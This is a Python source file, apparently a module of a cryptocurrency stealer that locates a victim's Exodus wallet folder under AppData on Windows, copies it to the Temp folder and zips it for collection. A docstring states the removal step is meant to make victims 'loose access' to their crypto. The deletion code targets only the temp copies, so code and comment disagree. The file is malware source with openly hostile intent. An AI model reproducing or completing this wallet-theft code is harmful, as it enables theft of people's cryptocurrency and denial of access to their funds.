import shutil
import os.path 

from colorama import *

client: str = os.path.expanduser("~")
source_dir = client + "\\AppData\\Roaming\\Exodus"
dest_dir = client + "\\AppData\\Local\\Temp\\Exodus"

class Files: 
    def __init__(self) -> None:
        pass
    
    def path_exists() -> bool:
        """Check if path exists that includes the Exodus data.

        Returns:
            bool: If the path exists or not.
        """
        if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):
            print(f"{Fore.GREEN}[PATH FOUND]{Fore.RESET} {client}\\AppData\\Roaming\\Exodus")
            return True
        else:
            return False
        
    def zip_files() -> bool:
        """ZIP the Exodus files that contain the data needed.

        Returns:
            bool: If we could ZIP the data needed or not.
        """
        try:
            if os.path.exists(dest_dir):
                shutil.rmtree(dest_dir)
                print(f"{Fore.RED}[REMOVED PATH]{Fore.RESET} {dest_dir}")
                
            shutil.copytree(source_dir, dest_dir)
            shutil.make_archive(dest_dir, "zip", dest_dir)
            
            print(f"{Fore.GREEN}[CREATED ZIP]{Fore.RESET} {dest_dir}")
            
            return True
        except:
            return False
        
    def remove_files() -> bool:
        """Remove the Exodus files so crypto can't be sent by the user and they loose access.

        Returns:
            bool: If we can remove the files from the system or not.
        """
        try:
            os.remove(client + "\\AppData\\Local\\Temp\\Exodus.zip")
            print(f"{Fore.GREEN}[REMOVED FILES]{Fore.RESET} {client}\\AppData\\Local\\Temp\\Exodus.zip")
            os.remove(client + "\\AppData\\Local\\Temp\\Exodus")
            print(f"{Fore.GREEN}[REMOVED FILES]{Fore.RESET} {client}\\AppData\\Local\\Temp\\Exodus")
            return True
        except:
            print(f"{Fore.RED}[ERROR]{Fore.RESET} Couldn't delete ZIP file.")
            return False